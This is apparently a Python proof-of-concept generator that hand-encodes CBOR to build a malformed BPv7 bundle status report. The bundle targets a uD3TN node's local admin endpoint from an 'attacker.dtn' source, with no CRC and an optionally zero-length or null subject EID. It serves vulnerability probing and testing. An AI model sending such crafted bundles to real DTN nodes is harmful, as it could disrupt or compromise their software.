#!/usr/bin/env python3
"""Generate a minimal BPv7 administrative-record bundle for loopback probes.

The primary block has no CRC (allowed by the pinned v0.15.1 build,
include/bundle7/bundle7.h:16-18) and the payload block carries a CBOR
bundle-status-report whose subject source EID can be zero-length, null, or
normal. No cbor2 dependency: this implements the small subset of CBOR needed.
"""
import argparse
import pathlib
import time

DTN_EPOCH_UNIX = 946684800  # 2000-01-01T00:00:00Z

def uint(n):
    assert 0 <= n < 2**64
    if n < 24:
        return bytes([n])
    if n < 256:
        return bytes([0x18, n])
    if n < 65536:
        return bytes([0x19, n >> 8, n & 0xFF])
    if n < 2**32:
        return bytes([0x1A]) + n.to_bytes(4, "big")
    return bytes([0x1B]) + n.to_bytes(8, "big")


def array(items):
    assert len(items) < 24
    return bytes([0x80 | len(items)]) + b"".join(items)


def text(s):
    data = s.encode("utf-8")
    assert len(data) < 256
    return bytes([0x60 | len(data)]) + data if len(data) < 24 \
        else bytes([0x78, len(data)]) + data


def byte_string(data):
    assert len(data) < 65536
    if len(data) < 24:
        return bytes([0x40 | len(data)]) + data
    if len(data) < 256:
        return bytes([0x58, len(data)]) + data
    return bytes([0x59, len(data) >> 8, len(data) & 0xFF]) + data


def eid_dtn(ssp):
    return array([uint(1), text(ssp)])


def make_bundle(subject_eid, seq=1, reason=2):
    ts_ms = (int(time.time()) - DTN_EPOCH_UNIX) * 1000
    status_info = array([array([b"\xf4"]) for _ in range(4)])
    timestamp = array([uint(ts_ms), uint(seq)])
    # Bundle status report: [type 1, [status info, reason, subject EID, time]]
    admin = array([
        uint(1),
        array([status_info, uint(reason), subject_eid, timestamp]),
    ])
    primary = array([
        uint(7), uint(2), uint(0),           # version, ADMIN flag, no CRC
        eid_dtn("//ud3tn.dtn/"),              # destination: local admin endpoint
        eid_dtn("//attacker.dtn/"),           # bundle source
        array([uint(1), uint(0)]),            # report-to = dtn:none
        timestamp,
        uint(86400000),                       # lifetime 1 day
    ])
    payload_block = array([
        uint(1), uint(1), uint(0), uint(0),  # type, number, flags, no CRC
        byte_string(admin),
    ])
    return b"\x9f" + primary + payload_block + b"\xff", admin


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    ap.add_argument("--eid", choices=("zero", "null", "normal"),
                    default="zero")
    ap.add_argument("--seq", type=int, default=1)
    args = ap.parse_args()
    subject = {
        "zero": eid_dtn(""),
        "null": array([uint(1), uint(0)]),
        "normal": eid_dtn("//attacker.dtn/"),
    }[args.eid]
    bundle, admin = make_bundle(subject, args.seq)
    pathlib.Path(args.out).write_bytes(bundle)
    print(f"eid={args.eid} bundle={bundle.hex()} admin={admin.hex()}")


if __name__ == "__main__":
    main()
